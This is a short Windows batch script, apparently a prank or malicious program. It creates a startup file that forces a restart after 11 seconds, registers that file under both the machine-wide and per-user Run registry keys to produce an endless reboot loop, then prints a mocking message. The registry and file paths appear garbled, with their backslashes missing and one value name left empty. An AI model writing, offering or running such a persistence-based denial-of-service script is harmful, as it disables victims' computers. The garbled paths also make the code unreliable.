echo @echo off>c:windowstartshell.bat
echo break off>>c:windowstartshell.bat
echo shutdown -r -t 11 -f>>c:windowstartshell.bat
echo end>>c:windowstartshell.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowstartshell.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d c:windowstartshell.bat /f
echo Buy a new computer, this one sucks
pause